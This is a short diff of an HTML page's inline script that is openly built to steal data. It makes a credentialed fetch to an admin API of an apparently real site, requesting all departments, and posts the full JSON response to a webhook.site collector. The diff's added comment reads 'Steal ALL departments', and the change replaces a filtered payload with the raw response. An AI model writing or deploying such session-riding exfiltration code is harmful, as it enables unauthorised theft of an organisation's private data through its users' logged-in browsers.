@@ -28,19 +28,17 @@
     <script>
         const WEBHOOK = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
         
+        // Steal ALL departments with full paginated response
         fetch('https://admin.genesislab.in/api/departments?rowsPerPage=100', {
             credentials: 'include'
         })
         .then(r => r.json())
         .then(data => {
+            // Send the EXACT response you want
             fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({
-                    total: data.total,
-                    departments: data.data,
-                    timestamp: new Date().toISOString()
-                })
+                body: JSON.stringify(data)
             });
         });
     </script>
